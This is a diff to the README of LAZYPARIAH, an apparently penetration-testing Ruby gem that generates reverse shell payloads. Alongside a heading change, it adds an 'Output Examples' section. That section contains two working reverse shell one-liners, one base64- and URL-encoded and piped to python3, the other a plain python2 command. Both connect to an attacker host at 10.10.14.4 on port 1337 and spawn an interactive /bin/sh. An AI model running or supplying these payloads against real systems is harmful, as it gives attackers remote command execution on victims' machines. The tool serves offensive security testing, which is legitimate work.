@@ -15,7 +15,7 @@ LAZYPARIAH can be installed as follows:
 gem install lazypariah
 ```
 
-### Usage
+## Usage
 ```
 Usage:  lazypariah [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>
 Note:   <ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.
@@ -52,6 +52,16 @@ Valid Options:
     -l, --license                    Display license information and exit.
     -u, --url                        URL-encode the payload.
     -v, --version                    Display version information and exit.
+```
+
+## Output Examples
+Output of command `lazypariah -u python3_b64 10.10.14.4 1337`:
+```
+echo%20aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%20%7C%20base64%20-d%20%7C%20python3
+```
+Output of command `lazypariah python2_c 10.10.14.4 1337`:
+```
+python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ## Author
